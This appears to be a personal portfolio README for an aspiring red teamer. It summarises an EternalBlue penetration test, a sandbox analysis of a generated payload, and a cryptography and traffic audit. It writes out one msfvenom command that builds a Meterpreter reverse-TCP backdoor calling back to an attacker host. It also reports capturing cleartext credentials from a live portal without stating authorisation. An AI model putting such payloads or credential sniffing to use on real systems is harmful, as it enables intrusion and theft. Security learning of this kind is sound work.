## 👨‍💻 About Me
* **Name:** Ezar Dega Auffa
* **Role:** Aspiring Red Teamer | Offensive Security Practitioner
* **Focus:** Adversary Simulation, Exploit Development, Malware Analysis.

* **Bio:**
  I am a Cyber Security enthusiast transitioning into **Red Teaming** and **Adversary Simulation**. Currently sharpening my offensive capabilities through the *Dibimbing.id* intensive bootcamp, with a specific interest in understanding how advanced persistent threats (APTs) operate to better defend critical infrastructures.
 My engineering mindset was proven by achieving a **Silver Medal in GYIIF** for conceptualizing a laser-based data transfer system. This experience honed my ability to design complex logical flows, which I now apply in understanding system vulnerabilities. Whith that as my basic currently i transalting my logical skills into code, actively mastering **C++** (for malware development concepts) and **Python** (for automation) to build my own offensive tools.
 my role as **Head of Language Division (Thursina Student Aassotiation)** and **INTERPOL Delegate at AYIMUN** trained me in strategic communication and psychology—key assets I leverage for **Social Engineering** scenarios and professional executive reporting.

 ## **Projects**
 * ## 🏢 Project 1: Legacy System Vulnerability Assessment & Hardening

* **Objective:** Conducted a grey-box penetration test on a corporate server environment to identify critical vulnerabilities in legacy infrastructure (Windows 7) and develop a comprehensive mitigation strategy.
* **Target Environment:** Windows 7 (Legacy), SMB Services.
* **Tools Used:** Nmap v7.95, Metasploit Framework, CVSS Scoring.

### **Methodology & Execution**

1.  **Reconnaissance (Mapping the Attack Surface)**
    * Utilized `nmap -sS -sC` to identify open ports.
    * **Findings:** Detected open ports **139 & 445 (SMB/NetBIOS)** and **3389 (RDP)**.
    * **Vulnerability:** Service version enumeration revealed the OS was unpatched against **MS17-010 (EternalBlue)**.

2.  **Exploitation (Proof of Concept)**
    * Leveraged the **EternalBlue** exploit to demonstrate how an attacker could execute remote code via specially crafted packets.
    * **Impact:** Gained `SYSTEM` level access without authentication.


3.  **Mitigation & Recovery Strategy**
    * **Immediate Action:** Patch the OS with Microsoft Security Bulletin MS17-010.
    * **Long-term:** Migrate legacy Windows 7 systems to supported OS (Windows 10/11 or Linux).
    * **Compliance:** Prepare the infrastructure for **ISO27001** certification to ensure standard security controls are in place.

---
## 🦠 Project 2: Custom Payload Development & Sandbox Analysis

* **Objective:** Generated and analyzed a custom reverse-shell payload to simulate an adversarial attack vector and understand how Endpoint Detection & Response (EDR) systems identify malicious signatures.
* **Tools Used:** Kali Linux, Msfvenom, VirusTotal, Any.Run (Sandbox).

### **Methodology & Execution**

1.  **Payload Generation**
    * Crafted a `windows/meterpreter/reverse_tcp` artifact using `msfvenom` to simulate a backdoor connection.
    * *Command:* `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe > payload.exe`

2.  **Static Analysis (VirusTotal)**
    * Assessed the payload against 70+ antivirus engines.
    * **Result:** High detection rate due to the lack of obfuscation/encoding, confirming the efficiency of signature-based detection for known payloads.

3.  **Dynamic Analysis (Any.Run Sandbox)**
    * Executed the malware in a controlled Sandbox environment.
    * **Network Forensics:** Observed the process initiating a **TCP Handshake** to the C2 Server (LHOST) on port 4444.
    * **IOCs Identified:** Documented file hashes (MD5/SHA256) and C2 IP addresses for Blue Team blocking.

---
## Project 3: 📝 Cryptographic Implementation Audit & Traffic Analysis
* **Objective:** Analyzed critical cryptographic failures in data storage and transmission protocols to demonstrate the risks of legacy algorithms and unencrypted channels (OWASP A02: Cryptographic Failures).

* **Tools Used:**  Wireshark (Network Sniffing), Hashcat (Simulation), Browser DevTools.

**Methodology:**

*Hashing Algorithm Stress Test:

Developed a Python script to compare MD5 vs bcrypt hashing integrity.

* **Finding:** Demonstrated MD5's vulnerability to collision attacks and ease of cracking, contrasted with bcrypt's salt implementation which prevents rainbow table attacks.

* **Data Storage Analysis:**

Audited database schemas to compare Plaintext password storage vs. Hashed storage.

* **Risk Assessment:** Highlighted the catastrophic impact of data breaches on systems storing credentials in plaintext.

* **Network Traffic Forensics** (HTTP vs HTTPS):

*Conducted a packet sniffing simulation on two live targets (Academic Portal vs Legal Entity Portal).

*Outcome: Captured cleartext credentials on the HTTP target, proving susceptibility to Man-in-the-Middle (MitM) attacks, while validating TLS encryption effectiveness on the HTTPS target.

*Outcome: Formulated a remediation guideline mandating the use of Argon2/bcrypt for data at rest and enforcing SSL/TLS for all data in transit.

* **Technical Arsenal:**
  * **Offensive:** Metasploit, Cobalt Strike (Study), Burp Suite.
  * **Development:** C++ , Python , Bash.
  * **Soft Skills:** Strategic Planning (TSA Language Div. Head), Negotiation & Public Speaking.

* **Contact:** [ezar.dega17@gmail.com](mailto:ezar.dega17@gmail.com) | [https://www.linkedin.com/in/ezar-dega-auffa-36582a328/]

---
